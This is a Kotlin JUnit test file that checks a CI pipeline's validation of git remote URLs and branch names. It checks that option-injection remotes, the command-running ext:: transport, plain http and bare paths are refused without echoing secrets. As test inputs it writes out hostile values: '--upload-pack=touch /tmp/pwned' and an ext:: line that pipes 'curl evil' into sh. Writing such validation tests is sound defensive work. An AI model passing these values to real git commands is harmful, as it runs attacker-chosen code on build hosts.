package dev.rubentxu.pipeline.v2.domain.scm

import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.assertThrows

/**
 * What a checkout may point at.
 *
 * **The guarantee.** A remote that git would read as an OPTION never becomes one.
 * git reads every argument that starts with `-` as an option, so a remote shaped
 * like `--upload-pack=…` is not a repository: it is an instruction to run a
 * program of the author's choosing. With a `file://` remote that program runs on
 * this machine, and it runs before git has decided whether the repository exists.
 *
 * **The dangerous row is the one that looks harmless.** `https://github.com/org/repo.git`
 * is a remote; `--upload-pack=touch /tmp/pwned` is the same length and the same
 * shape of string, and a rule that only recognised the scheme would wave it
 * through.
 *
 * **Why the refusal does not repeat the remote.** The remote is author-supplied and
 * may carry a credential, so the message names the FIELD and the RULE and, at
 * most, the option NAME. A refusal that echoed the offending string would publish
 * into the run's durable record the very secret the refusal exists to keep out of
 * it.
 */
class GitRemotePolicyTest {

    @Test
    fun `a remote that looks like an option is refused`() {
        val refusal = GitRemotePolicy.refusalFor("--upload-pack=touch /tmp/pwned", "main")

        assertTrue(
            refusal != null && refusal.contains("option"),
            "the refusal must say that git would read the remote as an option; it said: $refusal",
        )
    }

    @Test
    fun `the refusal names the option but never its value`() {
        val refusal = GitRemotePolicy.refusalFor("--upload-pack=touch /tmp/pwned", "main")!!

        assertTrue(
            refusal.contains("--upload-pack"),
            "the operator has to learn WHICH option git would have read, or the refusal is " +
                "useless; it said: $refusal",
        )
        assertFalse(
            refusal.contains("touch /tmp/pwned"),
            "the value of the option is a command, and a refusal that repeats it repeats the " +
                "attack in the run's record; it said: $refusal",
        )
    }

    @Test
    fun `a branch that looks like an option is refused`() {
        val refusal = GitRemotePolicy.refusalFor("https://github.com/org/repo.git", "--upload-pack=x")

        assertTrue(
            refusal != null && refusal.contains("branch"),
            "the refusal must name the field that is wrong; it said: $refusal",
        )
    }

    @Test
    fun `a transport that runs a command by design is refused`() {
        // git's `ext::` helper runs a shell command: `ext::sh -c '…'`.
        val refusal = GitRemotePolicy.refusalFor("ext::sh -c 'curl evil|sh'", "main")

        assertTrue(
            refusal != null && refusal.contains("transport"),
            "the refusal must name the transport rule; it said: $refusal",
        )
    }

    @Test
    fun `plain http is refused because it has no server authentication`() {
        assertTrue(
            GitRemotePolicy.refusalFor("http://github.com/org/repo.git", "main") != null,
            "http carries the credential in clear text and authenticates nobody",
        )
    }

    @Test
    fun `a bare local path is refused because it is not a remote`() {
        assertTrue(
            GitRemotePolicy.refusalFor("/tmp/some/repo", "main") != null,
            "a bare path is ambiguous with a relative path, and it was never a remote the " +
                "product claimed to support",
        )
    }

    @Test
    fun `the documented remotes are accepted`() {
        listOf(
            "https://github.com/org/repo.git",
            "ssh://git@github.com/org/repo.git",
            "file:///nowhere/repo.git",
            // The scp-like SSH form: the same SSH transport without a scheme.
            "git@github.com:org/repo.git",
        ).forEach { url ->
            assertNull(
                GitRemotePolicy.refusalFor(url, "main"),
                "the remote $url is one of the documented ones and must be accepted",
            )
        }
    }

    @Test
    fun `a colon that is not a scheme is not read as one`() {
        // A Windows drive letter is a path, not a scheme: `C` is one letter, and a
        // one-letter "scheme" is a drive.
        assertTrue(
            GitRemotePolicy.refusalFor("C:\\repos\\thing", "main") != null,
            "a drive letter is not a transport, and the rule must not accept it",
        )
    }

    @Test
    fun `requiring a safe remote throws a typed refusal`() {
        val thrown = assertThrows<GitRemotePolicy.GitRemoteRefused> {
            GitRemotePolicy.requireSafeRemote("--upload-pack=x", "main")
        }

        assertTrue(
            thrown.message!!.contains("option"),
            "the typed refusal must carry the reason; it said: ${thrown.message}",
        )
    }
}
